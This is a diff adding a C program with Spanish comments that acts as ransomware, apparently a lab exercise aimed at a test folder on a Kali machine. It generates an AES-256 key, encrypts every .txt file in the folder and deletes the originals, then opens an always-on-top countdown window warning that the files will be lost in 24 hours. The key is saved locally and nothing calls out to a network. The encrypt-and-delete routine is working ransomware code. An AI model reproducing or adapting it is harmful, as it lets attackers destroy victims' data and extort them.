@@ -1,0 +1,206 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <dirent.h>
+#include <time.h>
+#include <openssl/evp.h>
+#include <openssl/rand.h>
+#include <SDL2/SDL.h>
+#include <SDL2/SDL_ttf.h>
+
+#define CARPETA "/home/kali/archivos_prueba/"
+#define CLAVE_LEN 32
+#define IV_LEN 16
+#define DURACION_SEGUNDOS 86400  
+
+// Genera una clave y un vector de inicialización aleatorios, y los guarda en un archivo
+void generar_clave_iv(unsigned char *clave, unsigned char *iv) {
+    RAND_bytes(clave, CLAVE_LEN);
+    RAND_bytes(iv, IV_LEN);
+    FILE *f = fopen("clave.key", "wb");
+    fwrite(clave, 1, CLAVE_LEN, f);
+    fwrite(iv, 1, IV_LEN, f);
+    fclose(f);
+}
+
+// Verifica si el archivo tiene extensión .txt
+int es_txt(const char *nombre) {
+    const char *ext = strrchr(nombre, '.');
+    return ext && strcmp(ext, ".txt") == 0;
+}
+
+// Cifra un archivo utilizando AES-256-CBC y guarda el resultado con extensión .chacho
+void cifrar_archivo(const char *ruta, unsigned char *clave, unsigned char *iv) {
+    FILE *in = fopen(ruta, "rb");
+    fseek(in, 0, SEEK_END);
+    long tam = ftell(in);          // Obtiene el tamaño del archivo
+    rewind(in);
+    unsigned char *buffer = malloc(tam);
+    fread(buffer, 1, tam, in);     // Lee el archivo completo
+    fclose(in);
+
+    // Prepara el contexto de cifrado con OpenSSL
+    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
+    unsigned char *cipher = malloc(tam + EVP_MAX_BLOCK_LENGTH);
+    int len, final_len;
+
+    // Inicializa y ejecuta el cifrado
+    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, clave, iv);
+    EVP_EncryptUpdate(ctx, cipher, &len, buffer, tam);
+    EVP_EncryptFinal_ex(ctx, cipher + len, &final_len);
+    EVP_CIPHER_CTX_free(ctx);
+
+    // Guarda el archivo cifrado con nueva extensión
+    char new_ruta[512];
+    snprintf(new_ruta, sizeof(new_ruta), "%s.chacho", ruta);
+    FILE *out = fopen(new_ruta, "wb");
+    fwrite(cipher, 1, len + final_len, out);
+    fclose(out);
+
+    remove(ruta); // Elimina el archivo original
+
+    free(buffer);
+    free(cipher);
+}
+
+// Recorre todos los archivos de una carpeta y cifra los archivos .txt encontrados
+void recorrer_y_cifrar(const char *ruta, unsigned char *clave, unsigned char *iv) {
+    DIR *d = opendir(ruta);
+    struct dirent *dir;
+    char path[512];
+
+    while ((dir = readdir(d)) != NULL) {
+        if (strcmp(dir->d_name, ".") == 0 || strcmp(dir->d_name, "..") == 0) continue;
+
+        snprintf(path, sizeof(path), "%s%s", ruta, dir->d_name);
+        if (dir->d_type == DT_REG && es_txt(dir->d_name)) {
+            cifrar_archivo(path, clave, iv);
+            printf("Cifrado: %s\n", path);
+        }
+    }
+    closedir(d);
+}
+
+// Muestra una GUI con cuenta regresiva usando SDL2, simulando amenaza de ransomware
+void mostrar_GUI() {
+    SDL_Init(SDL_INIT_VIDEO);
+    TTF_Init();
+
+    SDL_Window* ventana = SDL_CreateWindow("RANSOMWARE DETECTADO",
+        SDL_WINDOWPOS_CENTERED, SDL_WINDOWPOS_CENTERED, 800, 600,
+        SDL_WINDOW_SHOWN | SDL_WINDOW_ALWAYS_ON_TOP);
+    SDL_Renderer* renderer = SDL_CreateRenderer(ventana, -1, 0);
+
+    TTF_Font* font = TTF_OpenFont("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 28);
+    TTF_Font* reloj_font = TTF_OpenFont("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 22);
+    SDL_Color blanco = {255, 255, 255};
+    SDL_Color rojo = {255, 0, 0};
+    SDL_Color fondo = {180, 0, 0};
+
+    // Mensaje principal de advertencia
+    const char* mensaje =
+        "Tus archivos han sido encriptados.\n"
+        "Tienes 24 horas para recuperarlos.\n"
+        "De lo contrario, todo se perdera.";
+
+    SDL_Surface* texto_surface = TTF_RenderText_Blended_Wrapped(font, mensaje, blanco, 700);
+    SDL_Texture* texto = SDL_CreateTextureFromSurface(renderer, texto_surface);
+    SDL_Rect rect_mensaje = {50, 200, texto_surface->w, texto_surface->h};
+    SDL_FreeSurface(texto_surface);
+
+    // Inicia la cuenta regresiva
+    Uint32 inicio = SDL_GetTicks();
+    Uint32 tiempo_restante = DURACION_SEGUNDOS;
+    SDL_Event e;
+    int ejecutando = 1;
+    int parpadeo = 1;
+    Uint32 ultimo_cambio = SDL_GetTicks();
+    int tiempo_finalizado = 0;
+
+    while (ejecutando) {
+        SDL_SetRenderDrawColor(renderer, fondo.r, fondo.g, fondo.b, 255);
+        SDL_RenderClear(renderer);
+
+        // Controla parpadeo del mensaje
+        Uint32 ahora = SDL_GetTicks();
+        if (ahora - ultimo_cambio >= 700) {
+            parpadeo = !parpadeo;
+            ultimo_cambio = ahora;
+        }
+
+        // Calcula tiempo restante
+        Uint32 transcurrido = (ahora - inicio) / 1000;
+        tiempo_restante = (transcurrido >= DURACION_SEGUNDOS) ? 0 : DURACION_SEGUNDOS - transcurrido;
+
+        int horas = tiempo_restante / 3600;
+        int minutos = (tiempo_restante % 3600) / 60;
+        int segundos = tiempo_restante % 60;
+
+        char tiempo_str[32];
+        snprintf(tiempo_str, sizeof(tiempo_str), "Tiempo restante: %02d:%02d:%02d", horas, minutos, segundos);
+
+        SDL_Surface* reloj_surface = TTF_RenderText_Blended(reloj_font, tiempo_str, blanco);
+        SDL_Texture* reloj_texto = SDL_CreateTextureFromSurface(renderer, reloj_surface);
+        SDL_Rect rect_reloj = {
+            rect_mensaje.x,
+            rect_mensaje.y + rect_mensaje.h + 20,
+            reloj_surface->w,
+            reloj_surface->h
+        };
+        SDL_FreeSurface(reloj_surface);
+
+        // Muestra mensaje o mensaje final
+        if (tiempo_restante > 0) {
+            if (parpadeo) SDL_RenderCopy(renderer, texto, NULL, &rect_mensaje);
+            SDL_RenderCopy(renderer, reloj_texto, NULL, &rect_reloj);
+        } else {
+            if (!tiempo_finalizado) {
+                SDL_DestroyTexture(texto);
+                texto_surface = TTF_RenderText_Blended_Wrapped(font,
+                    "Tus archivos han sido eliminados.",
+                    rojo, 700);
+                texto = SDL_CreateTextureFromSurface(renderer, texto_surface);
+                rect_mensaje.w = texto_surface->w;
+                rect_mensaje.h = texto_surface->h;
+                SDL_FreeSurface(texto_surface);
+                tiempo_finalizado = 1;
+            }
+            if (parpadeo) SDL_RenderCopy(renderer, texto, NULL, &rect_mensaje);
+        }
+
+        SDL_RenderPresent(renderer);
+        SDL_DestroyTexture(reloj_texto);
+
+        // Permite salir si se cierra la ventana
+        while (SDL_PollEvent(&e)) {
+            if (e.type == SDL_QUIT) ejecutando = 0;
+        }
+    }
+
+    // Limpieza
+    SDL_DestroyTexture(texto);
+    TTF_CloseFont(font);
+    TTF_CloseFont(reloj_font);
+    SDL_DestroyRenderer(renderer);
+    SDL_DestroyWindow(ventana);
+    TTF_Quit();
+    SDL_Quit();
+}
+
+int main() {
+    // Declaramos la clave de cifrado (32 bytes) y el vector de inicialización (16 bytes)
+    unsigned char clave[CLAVE_LEN];
+    unsigned char iv[IV_LEN];
+
+    // Generamos la clave y el IV aleatoriamente y los guardamos en un archivo
+    generar_clave_iv(clave, iv);
+
+    // Recorremos todos los archivos .txt dentro de la carpeta especificada y los ciframos
+    recorrer_y_cifrar(CARPETA, clave, iv);
+
+    // Mostramos la GUI con el mensaje de ransomware y el temporizador de 24 horas
+    mostrar_GUI();
+
+    
+    return 0;
+}
